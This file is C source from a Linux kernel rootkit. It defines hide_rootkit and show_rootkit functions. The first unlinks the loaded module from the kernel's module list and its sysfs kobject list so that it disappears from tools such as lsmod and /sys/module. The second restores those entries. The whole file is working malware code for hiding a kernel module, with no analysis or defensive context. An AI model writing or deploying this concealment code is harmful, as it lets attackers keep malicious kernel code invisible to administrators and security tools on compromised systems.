#include "hide_module.h"

static struct list_head *prev_kobj;

#define DEL_SYSFS

void hide_rootkit(void) {
        if (visiblity == VISIBLE) {
                prev_module = THIS_MODULE->list.prev;
                prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
                list_del(&THIS_MODULE->list);
#ifdef DEL_SYSFS
                list_del(&THIS_MODULE->mkobj.kobj.entry);
#endif
                visiblity = HIDDEN;
        }
}


void show_rootkit(void) {
        if (visiblity == HIDDEN) {
                list_add(&THIS_MODULE->list, prev_module);
#ifdef DEL_SYSFS
                list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj);
#endif
                visiblity = VISIBLE;
        }
}
